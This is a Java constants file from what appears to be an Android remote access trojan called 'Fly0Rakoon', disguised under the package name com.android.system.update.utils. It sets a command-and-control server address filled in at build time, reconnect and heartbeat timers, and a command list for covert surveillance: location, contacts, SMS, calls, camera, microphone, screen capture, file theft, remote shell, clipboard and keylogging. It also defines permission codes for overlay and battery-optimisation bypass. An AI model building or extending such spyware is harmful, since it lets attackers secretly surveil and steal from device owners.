package com.android.system.update.utils;

public class Constants {
    
    // Server Configuration - These will be replaced by GitHub Actions during build
    public static final String SERVER_IP = "127.0.0.1";  // Default, will be replaced
    public static final int SERVER_PORT = 5555;          // Default, will be replaced
    
    // Connection Settings
    public static final int CONNECTION_TIMEOUT = 10000;  // 10 seconds
    public static final int SOCKET_TIMEOUT = 30000;      // 30 seconds
    public static final int RECONNECT_DELAY = 5000;      // 5 seconds
    public static final int HEARTBEAT_INTERVAL = 30000;  // 30 seconds
    
    // Notification Settings
    public static final int NOTIFICATION_ID = 1337;
    public static final String CHANNEL_ID = "fly0rakoon_channel";
    public static final String CHANNEL_NAME = "Fly0Rakoon Service";
    
    // Command Constants
    public static final String CMD_HELP = "help";
    public static final String CMD_INFO = "info";
    public static final String CMD_LOCATION = "location";
    public static final String CMD_CONTACTS = "contacts";
    public static final String CMD_SMS = "sms";
    public static final String CMD_CALLS = "calls";
    public static final String CMD_CAMERA = "camera";
    public static final String CMD_CAMERA_FRONT = "camera_front";
    public static final String CMD_CAMERA_BACK = "camera_back";
    public static final String CMD_MIC = "mic";
    public static final String CMD_MIC_STOP = "mic_stop";
    public static final String CMD_SCREENSHOT = "screenshot";
    public static final String CMD_SCREEN_RECORD = "screen_record";
    public static final String CMD_FILES = "files";
    public static final String CMD_DOWNLOAD = "download";
    public static final String CMD_UPLOAD = "upload";
    public static final String CMD_SHELL = "shell";
    public static final String CMD_EXIT = "exit";
    
    // File paths
    public static final String BASE_STORAGE_PATH = "/storage/emulated/0/";
    public static final String APP_FOLDER = "Fly0Rakoon";
    public static final String SCREENSHOTS_FOLDER = "Screenshots";
    public static final String RECORDINGS_FOLDER = "Recordings";
    public static final String PHOTOS_FOLDER = "Photos";
    
    // Device Info Commands
    public static final String CMD_BATTERY = "battery";
    public static final String CMD_NETWORK = "network";
    public static final String CMD_APPS = "apps";
    public static final String CMD_CLIPBOARD = "clipboard";
    public static final String CMD_KEYLOGGER = "keylogger";
    
    // Response Codes
    public static final String RESPONSE_OK = "OK";
    public static final String RESPONSE_ERROR = "ERROR";
    public static final String RESPONSE_DATA = "DATA";
    public static final String RESPONSE_FILE = "FILE";
    
    // File Transfer
    public static final int BUFFER_SIZE = 8192;
    public static final int CHUNK_SIZE = 65536;  // 64KB chunks for file transfer
    
    // Permission Request Codes
    public static final int PERMISSION_REQUEST_CODE = 100;
    public static final int CAMERA_PERMISSION_CODE = 101;
    public static final int MICROPHONE_PERMISSION_CODE = 102;
    public static final int LOCATION_PERMISSION_CODE = 103;
    public static final int STORAGE_PERMISSION_CODE = 104;
    public static final int CONTACTS_PERMISSION_CODE = 105;
    public static final int SMS_PERMISSION_CODE = 106;
    public static final int PHONE_PERMISSION_CODE = 107;
    public static final int OVERLAY_PERMISSION_CODE = 108;
    public static final int IGNORE_BATTERY_CODE = 109;
    
    // Screen Recording
    public static final int SCREEN_RECORD_REQUEST_CODE = 200;
    public static final int MEDIA_PROJECTION_REQUEST_CODE = 201;
}